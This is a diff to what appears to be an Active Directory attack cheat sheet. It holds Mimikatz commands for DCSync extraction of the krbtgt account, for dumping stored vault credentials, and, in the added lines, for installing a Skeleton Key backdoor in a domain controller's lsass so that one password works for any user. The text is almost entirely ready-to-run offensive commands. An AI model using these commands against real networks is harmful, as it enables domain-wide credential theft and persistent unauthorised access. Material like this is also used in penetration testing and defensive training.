@@ -100,3 +100,7 @@ C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
 ```powershell
 C:> Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
 ```
+- **Patch a DC `lsass` process** allowing to use any user with single password. DA privileges are required.
+```powershell
+C:> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <hostname_full_FQDN>
+```
